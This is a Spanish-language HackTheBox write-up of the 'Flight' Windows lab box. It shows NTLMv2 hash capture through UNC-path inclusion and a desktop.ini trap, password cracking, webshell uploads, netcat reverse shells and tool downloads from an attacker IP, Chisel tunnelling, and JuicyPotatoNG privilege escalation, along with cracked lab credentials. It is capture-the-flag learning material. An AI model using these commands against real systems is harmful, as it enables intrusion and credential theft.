---
layout: single
title: Flight - HackTheBox
excerpt: " Hard box in which the Windows 'smb' service is listed, as well as using password cracking techniques, RFI, Port Forwarding, etc. "
date: 2023-05-23
classes: wide
header:
  teaser: /blog/assets/images/htb-writeup-flight/Flight.png
  teaser_home_page: true
  icon: /blog/assets/images/htb.webp
categories:
  - hackthebox
tags:
  - Windows
  - RFI
  - crackmapexec
  - Port
  - Forwarding
  - Chisel
  - Powershell
---

Hard box in which the Windows "smb" service is listed, as well as using password cracking techniques, RFI, Port Forwarding, etc.

# Summary
- IP: 10.10.11.187
- OS: Windows 10
- Services & Applications:

```java
	PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
|_http-title: g0 Aviation
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-02-17 23:37:33Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
```


# Recon

- Escaneo básico de puertos:

```bash
$nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.11.187 -oG allPorts
```


- Escaneo profundo de puertos encontrados:

```bash
$nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49690,49699 -sCV 10.10.11.187 -oN targeted
```


# Análisis de página web:

- Al analizar el código fuente de la web principal por el puerto 80 encontramos la siguiente linea:

```html
<p class="lf">Copyright 2022 <a href="#">flight.htb</a> - All Rights Reserved</p>
```

- Agregamos `"flight.htb"` al "/etc/hosts" y escaneamos en busca de subdominios:

```bash
$gobuster vhost -u flight.htb -w /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 20
```

- Encontramos el subdominio `"school.flight.htb"`, lo agregamos al `"/etc/hosts"` y analizamos la página.


# RFI y autenticación SMB para obtener HASH NTLMv2:

- Dentro de la página, al dar click en una de las pestañas presentadas, por ejemplo en la pestaña "Home" podemos darnos cuenta en el link que se realiza una petición GET con la siguiente estructura:

```
http://school.flight.htb/index.php?view=home.html
```

- Sospechamos de un posible LFI, sin embargo si intentamos apuntar a archivos locales fuera del directorio actual, no se nos muestra en pantalla, lo que nos hace pensar que está sanitizado con algún filtro dentro del código.

- En lugar de un LFI, podemos intentar aplicar un `RFI`, sabiendo que en Windows, la sintaxis de recursos compartidos en red tiene la siguiente estructura: `"//dirección-ip/share"` podemos apuntar a un archivo cualquiera de nuestra máquina atacante, poniéndonos en escucha con el comando `"responder"` el cual interceptará cualquier intento de autenticación de un servicio específico:


```bash
$responder -I tun0 -wPv
```

	 En la m+aquina víctima apuntamos a:

```
http://school.flight.htb/index.php?view=//ip-máquina-atacante/test
```


- Al apuntar a dicho archivo de nuestra máquina, recibimos el siguiente output en el `"responder"`:


```bash
[SMB] NTLMv2-SSP Client   : 10.10.11.187
[SMB] NTLMv2-SSP Username : flight\svc_apache
[SMB] NTLMv2-SSP Hash     : svc_apache::flight:5cacd63943745ffe:93DF438A63823527ABB88910923D02A5:0101000000000000007156F58343D9013A36025E9794ECC8000000000200080032004C005200320001001E00570049004E002D004E0045004D0031005A0055004300420035004E00350004003400570049004E002D004E0045004D0031005A0055004300420035004E0035002E0032004C00520032002E004C004F00430041004C000300140032004C00520032002E004C004F00430041004C000500140032004C00520032002E004C004F00430041004C0007000800007156F58343D901060004000200000008003000300000000000000000000000003000007FC06B365CFCD3F7ACF5397EF85A635778917CF85A75006BE03BDB34EDABF3D70A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00310039000000000000000000
```

- Vemos que se hizo una autenticación por el servicio `SMB` y se ha capturado el respectivo `hash NTLMv2`.

- Guardamos el hash capturado y lo crackeamos con John:

```bash
$john -w:/usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt hash
```

- Obtenemos la credencial del usuario "svc_apache"; la guardamos en un archivo "credentials".

# Análisis de servicio SMB con crackmapexec:


- Validamos que el usuario `"svc_apache"` y la credencial encontrada son válidas dentro del sistema:

```bash
$crackmapexec smb 10.10.11.187 -u svc_apache -p 'S@Ss!K@*t13'
```

```bash
SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.187    445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
```

- Sí que son válidas, ahora con este usuario podríamos enumerar a los demás existentes dentro del sistema:

```bash
crackmapexec smb 10.10.11.187 -u svc_apache -p 'S@Ss!K@*t13' --users
```

```
SMB         10.10.11.187    445    G0               flight.htb\O.Possum                       badpwdcount: 2 baddpwdtime: 2023-02-18 00:03:40.174200+00:00
SMB         10.10.11.187    445    G0               flight.htb\svc_apache                     badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         10.10.11.187    445    G0               flight.htb\V.Stevens                      badpwdcount: 1 baddpwdtime: 2023-02-18 00:03:43.663855+00:00
SMB         10.10.11.187    445    G0               flight.htb\D.Truff                        badpwdcount: 1 baddpwdtime: 2023-02-18 00:03:44.420353+00:00
SMB         10.10.11.187    445    G0               flight.htb\I.Francis                      badpwdcount: 1 baddpwdtime: 2023-02-18 00:03:45.146294+00:00
SMB         10.10.11.187    445    G0               flight.htb\W.Walker                       badpwdcount: 1 baddpwdtime: 2023-02-18 00:03:45.870646+00:00
SMB         10.10.11.187    445    G0               flight.htb\C.Bum                          badpwdcount: 0 baddpwdtime: 2023-02-18 00:03:46.570412+00:00
SMB         10.10.11.187    445    G0               flight.htb\M.Gold                         badpwdcount: 1 baddpwdtime: 2023-02-18 00:03:47.315115+00:00
SMB         10.10.11.187    445    G0               flight.htb\L.Kein                         badpwdcount: 1 baddpwdtime: 2023-02-18 00:03:48.090471+00:00
SMB         10.10.11.187    445    G0               flight.htb\G.Lors                         badpwdcount: 1 baddpwdtime: 2023-02-18 00:03:48.885458+00:00
SMB         10.10.11.187    445    G0               flight.htb\R.Cold                         badpwdcount: 1 baddpwdtime: 2023-02-18 00:03:49.734907+00:00
SMB         10.10.11.187    445    G0               flight.htb\S.Moon                         badpwdcount: 0 baddpwdtime: 2023-02-18 00:05:50.433521+00:00
SMB         10.10.11.187    445    G0               flight.htb\krbtgt                         badpwdcount: 1 baddpwdtime: 2023-02-18 00:03:52.827927+00:00
SMB         10.10.11.187    445    G0               flight.htb\Guest                          badpwdcount: 1 baddpwdtime: 2023-02-18 00:03:53.527925+00:00
SMB         10.10.11.187    445    G0               flight.htb\Administrator                  badpwdcount: 1 baddpwdtime: 2023-02-18
00:03:54.254576+00:00
```

- Guardamos en un archivo "users" cada uno de los usuarios que enumeramos e intentamos comprobar si alguno de estos reutiliza la credencial que habíamos encontrado:

```bash
$crackmapexec smb 10.10.11.187 -u users -p 'S@Ss!K@*t13' --continue-on-success
```

```bash
SMB         10.10.11.187    445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13
SMB         10.10.11.187    445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13
```

- Vemos que el usuario `"S.Moon"` usa la misma credencial, así que enumeramos los recursos compartidos en busca de alguno con permisos de escritura:

```bash
$crackmapexec smb 10.10.11.187 -u S.Moon -p 'S@Ss!K@*t13' --shares
```

```bash
SMB         10.10.11.187    445    G0               Share           Permissions     Remark
SMB         10.10.11.187    445    G0               -----           -----------     ------
SMB         10.10.11.187    445    G0               ADMIN$                          Remote Admin
SMB         10.10.11.187    445    G0               C$                              Default share
SMB         10.10.11.187    445    G0               IPC$            READ            Remote IPC
SMB         10.10.11.187    445    G0               NETLOGON        READ            Logon server share 
SMB         10.10.11.187    445    G0               Shared          READ,WRITE      
SMB         10.10.11.187    445    G0               SYSVOL          READ            Logon server share 
SMB         10.10.11.187    445    G0               Users           READ            
SMB         10.10.11.187    445    G0               Web             READ 
```

- Vemos el directorio `"Shared"` con permisos de escritura, accedemos mediante "smbclient" para verificar qué contiene:

```bash
$smbclient //10.10.11.187/Shared -U S.Moon --password='S@Ss!K@*t13'
```

```
smb: \> dir
  .                                   D        0  Sat Feb 18 17:46:04 2023
  ..                                  D        0  Sat Feb 18 17:46:04 2023
```

- No podemos ver nada dentro de este directorio, sin embargo podríamos aprovecharnos de los permisos de escritura para subir un archivo malicioso que apunte como ícono a un archivo cualquiera de nuestra máquina atacante, estando en escucha de nuevo con `"responder"` para intentar interceptar la autenticación de otro usuario del sistema:


```
$responder -I tun0 -wPv
```

```
$nano desktop.ini
```

``` #### Dentro de desktop.ini ####
[.ShellClassInfo]
IconResource=\\ip-atacante\test
```


```
smb: \> put desktop.ini 
putting file desktop.ini as \desktop.ini (0,1 kb/s) (average 0,1 kb/s)
```


```bash    #### Respuesta del responder ####
[SMB] NTLMv2-SSP Client   : 10.10.11.187
[SMB] NTLMv2-SSP Username : flight.htb\c.bum
[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:8d2fbfb79cd9180e:03174FBC0F33C08D4087ADE94EF46DC3:0101000000000000808F8E208743D90111D89A688538A5F10000000002000800330052003500350001001E00570049004E002D00560033005A0032005A00380037004B0033003000510004003400570049004E002D00560033005A0032005A00380037004B003300300051002E0033005200350035002E004C004F00430041004C000300140033005200350035002E004C004F00430041004C000500140033005200350035002E004C004F00430041004C0007000800808F8E208743D901060004000200000008003000300000000000000000000000003000007FC06B365CFCD3F7ACF5397EF85A635778917CF85A75006BE03BDB34EDABF3D70A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00310039000000000000000000
```


- Obtenemos el `Hash NTLMv2` del usuario "c.bum", lo intentamos romper con John:

```bash
$john -w:/usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt hash2
```

- Obtenemos la credencial del usuario `"c.bum"`, ahora de la misma manera, enumeramos los recursos compartidos con "SMB" en busca de aquellos con permisos de escritura:

```bash
$crackmapexec smb 10.10.11.187 -u c.bum -p 'Tikkycoll_431012284' --shares
```

```bash
SMB         10.10.11.187    445    G0               Share           Permissions     Remark
SMB         10.10.11.187    445    G0               -----           -----------     ------
SMB         10.10.11.187    445    G0               ADMIN$                          Remote Admin
SMB         10.10.11.187    445    G0               C$                              Default share
SMB         10.10.11.187    445    G0               IPC$            READ            Remote IPC
SMB         10.10.11.187    445    G0               NETLOGON        READ            Logon server share 
SMB         10.10.11.187    445    G0               Shared          READ,WRITE      
SMB         10.10.11.187    445    G0               SYSVOL          READ            Logon server share 
SMB         10.10.11.187    445    G0               Users           READ            
SMB         10.10.11.187    445    G0               Web             READ,WRITE  
```

- Vemos un directorio `"Web"` con permisos de escritura, accedemos a él para verificar que contiene:

```bash
$smbclient //10.10.11.187/Web -U C.bum --password='Tikkycoll_431012284'
```

```
smb: \> dir
  .                                   D        0  Sat Feb 18 17:57:52 2023
  ..                                  D        0  Sat Feb 18 17:57:52 2023
  flight.htb                          D        0  Sat Feb 18 17:57:00 2023
  school.flight.htb                   D        0  Sat Feb 18 17:57:00 2023
```

- Como podemos ver, tenemos capacidad de escritura en ambos dominios a los que tenemos acceso, para aprovecharnos de esto, solo debemos subir una   [WebShell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell) la cual nos permitirá ejecutar comandos dentro del sistema:

```
smb: \flight.htb\> put webshell.php 
```

- Ahora accedemos a la webshell desde el navegador y veremos el campo "cmd" el cual podremos ejecutar comandos.

- Ahora, usando el campo `"cmd"`, crearemos un directorio dentro del sistema:

```
mkdir C:\AndresRuizzzzz
```

- Y subimos el binario `"netcat.exe"` a este directorio creado, haciendo uso de un servidor http creado con python en nuestra máquina atacante:

```
curl http://10.10.14.19:8000/nc.exe -o C:\AndresRuizzzzz\nc.exe
```


- Ahora entablamos una `reverse shell` haciendo uso de dicho binario:

```
C:\AndresRuizzzzz\nc.exe -e powershell 10.10.14.19 443
```

- Habremos ganado acceso al sistema como el usuario `"svc_apache"`.

- Como teníamos una credencial smb válida, podemos probarla para entablar una shell como el usuario "C.Bum" haciendo uso del binario [RunasCs.exe](https://github.com/antonioCoco/RunasCs)

```powershell
PS C:\AndresRuizzzzz> curl 10.10.14.19:8000/RunasCs.exe -o RunasCs.exe
PS C:\AndresRuizzzzz> .\RunasCs.exe C.bum Tikkycoll_431012284 powershell -r 10.10.14.19:1234
```


- Habremos ganado acceso al sistema como "C.bum" y podremos ver la user flag en `"\users\C.Bum\Desktop"`, ahora haciendo un análisis de servicios vemos que hay un servicio web corriendo en el puerto 8000:

```powershell
PS C:\Windows\system32> netstat -oat
```


- Ahora hacemos `port forwarding` con `Chisel` para tener acceso a todos los puertos de la máquina víctima en nuestra máquina atacante, habiendo transferido previamente el binario de Chisel a la máquina víctima:

En máquina atacante:

```bash
$./chisel server --reverse --port 9999
```

```
$nano /etc/proxychains.conf 
######   Añadir en la última linea  #######
socks5 127.0.0.1 1080
```

	En el navegador, crear un proxy usando la extensión "FoxyProxy" , de tipo SOCKS5, en la IP 127.0.0.1 y en el pueto 1080

En máquina víctima:

```powershell
PS C:\AndresRuizzzzz> curl 10.10.14.19:8000/chisel.exe -o chisel.exe
PS C:\AndresRuizzzzz> ./chisel.exe client 10.10.14.19:9999 R:socks
```

- Ahora en nuestra máquina atacante podemos visitar en el navegador, usando el proxy que creamos, el contenido web del puerto 8000 y encontramos una página normal sin información interesante.

```
localhost:8000
```

- Sin embargo, en la máquina víctima, dentro del directorio `"C:\inetpub\development"` podemos encontrar los recursos de dicha web que hemos encontrado; dado que la web interpreta archivos "aspx" transferimos un "cmd.aspx" malicioso [cmd.aspx](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd.aspx)

```powershell
PS C:\inetpub\development> curl 10.10.14.19:88/cmd.aspx -o cmd.aspx
```

 - Accedemos a dicho recurso dentro del navegador y podremos ejecutar comandos dentro del sistema.

```
localhost:8000/cmd.aspx
```

- En el campo `"Program"` ponemos la dirección en la que habiamos descargado el netcat: `"C:\AndresRuizzzzz\nc.exe"`

- En el campo `"Arguments"` ponemos el comando para entablar la reverse shell: `"-e powershell 10.10.14.19 321"`

- Habremos ganado acceso al sistema como el usuario "iis apppool\defaultapppool"

# ESCALANDO PRIVILEGIOS:

- Si revisamos los `privilegios de usuario`, encontramos el siguiente:

```powershell
PS C:\AndresRuizzzzz> whoami /priv
```

```powershell
Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
```

`SeImpersonatePrivilege        Impersonate a client after authentication Enabled` 

```powershell
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

- Esto lo podemos explotar para escalar privilegios ejecutando el binario [JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG/releases) diciéndole que nos brinde una cmd de forma interactiva:

```powershell
PS C:\AndresRuizzzzz>curl 10.10.14.19:88/JuicyPotatoNG.exe -o JuicyPotatoNG.exe
PS C:\AndresRuizzzzz> ./JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -i
```

- Ya seremos nt `authority\system` y podremos ver la `root flag` en "\users\administrator\Desktop"
